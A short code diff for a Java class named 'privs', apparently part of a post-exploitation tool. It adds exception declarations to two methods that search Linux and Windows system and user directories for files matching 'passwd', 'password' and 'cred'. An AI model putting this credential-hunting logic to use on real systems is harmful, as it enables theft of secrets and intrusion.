@@ -136,7 +136,7 @@ public class privs {
 		return taskOut;
 	}
 
-	public static Hashtable linuxTextpass(Hashtable args) {
+	public static Hashtable linuxTextpass(Hashtable args) throws IOException {
 		Hashtable taskOut = new Hashtable();
 
         String[] searchPaths = new String[] {"/var/log","/etc","/home","/root"};
@@ -168,7 +168,7 @@ public class privs {
 		return taskOut;
 	}
 
-	public static Hashtable windowsTextpass(Hashtable args) {
+	public static Hashtable windowsTextpass(Hashtable args) throws IOException {
 		Hashtable taskOut = new Hashtable();
 		String[] searchPaths = new String[] {"C:\\Windows\\System32","C:\\Users"};
 		String[] searchFilters = new String[] {"passwd","password","cred"};
